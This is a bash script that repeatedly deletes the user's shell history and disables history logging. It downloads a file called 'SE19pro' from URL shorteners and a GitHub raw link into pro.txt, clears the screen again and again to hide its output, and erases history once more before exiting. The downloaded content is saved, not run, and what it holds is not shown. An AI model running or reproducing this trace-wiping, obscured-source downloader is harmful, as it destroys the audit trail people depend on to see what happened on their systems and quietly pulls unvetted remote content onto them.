#!/bin/bash
clear
rm -f ~/.bash_history && history -c && unset HISTFILE
rm -f ~/.bash_history && history -c && unset HISTFILE
rm -f ~/.bash_history && history -c && unset HISTFILE
rm -f ~/.bash_history && history -c && unset HISTFILE
rm -f ~/.bash_history && history -c && unset HISTFILE
rm -f ~/.bash_history && history -c && unset HISTFILE
rm -f ~/.bash_history && history -c && unset HISTFILE
clear
download_success=false
output_file="pro.txt"
clear
# Function to attempt downloading from a list of URLs
download_file() {
    local urls=("$@")
    for url in "${urls[@]}"; do
        if { wget -qO - "$url" >> "$output_file"; } || { curl -fsSL "$url" >> "$output_file"; }; then
            download_success=true
            clear
            break
        fi
    done
}

# List of URLs to try
urls=(
    "https://naturl.link/se19pro"
    "https://v.gd/se19pro"
    "https://raw.githubusercontent.com/mastercodin/stunning-enigma/refs/heads/main/SE19pro.txt"
)
clear
# Check for wget or curl and attempt to download
if command -v wget &> /dev/null; then
    download_file "${urls[@]}"
elif command -v curl &> /dev/null; then
    download_file "${urls[@]}"
else
    echo "Neither wget nor curl is installed. Cannot download the file."
    exit 1
fi

# Check if the download was successful
if [ "$download_success" = true ]; then
    echo "COMMAND SUCCESSFULLY EXECUTED!"
else
    echo "Looks like there is no internet or the command failed to execute."
fi
clear
# Clean up bash history
clear
rm -f ~/.bash_history && history -c && unset HISTFILE
clear
exit
